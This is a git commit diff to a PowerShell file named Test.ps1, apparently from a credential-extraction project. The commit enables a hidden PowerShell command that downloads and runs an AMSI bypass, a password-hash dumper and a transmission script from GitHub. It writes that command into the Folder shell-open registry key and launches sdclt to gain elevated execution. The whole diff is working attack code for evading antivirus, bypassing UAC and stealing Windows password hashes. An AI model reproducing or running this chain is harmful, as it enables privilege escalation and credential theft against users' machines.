d1bad695b2d98ff798bb897e92652fe487711a55
mo-tec <moritzpfefferkorn@hotmail.com>
2020-10-12 20:27:42 +0200

    Update Test.ps1

--- Test.ps1
+++ Test.ps1
@@ -1,5 +1,5 @@
-#$program = "powershell -windowstyle hidden IEX " + "(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/mo-tec/HashExtractor/master/AMSI-Bypass.ps1');IEX " + "(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/mo-tec/HashExtractor/master/Get-PassHashes.ps1');IEX " + "(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/mo-tec/HashExtractor/master/Invoke-Transmission.ps1');Get-PassHashes | Out-String | Invoke-Transmission -ip localhost"
-$program = "powershell"
+$program = "powershell -windowstyle hidden $a=((wget 'https://raw.githubusercontent.com/mo-tec/HashExtractor/master/AMSI-Bypass.ps1').Content);$b=((wget 'https://raw.githubusercontent.com/mo-tec/HashExtractor/master/Get-PassHashes.ps1').Content);$c=((wget 'https://raw.githubusercontent.com/mo-tec/HashExtractor/master/Invoke-Transmission.ps1').Content);IEX $a;IEX $b;IEX $c;Get-PassHashes | Out-String | Invoke-Transmission -ip localhost"
+#$program = "powershell"
 New-Item "HKCU:\Software\Classes\Folder\shell\open\command" -Force -Value $program
 New-ItemProperty -Path "HKCU:\Software\Classes\Folder\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force
 start sdclt
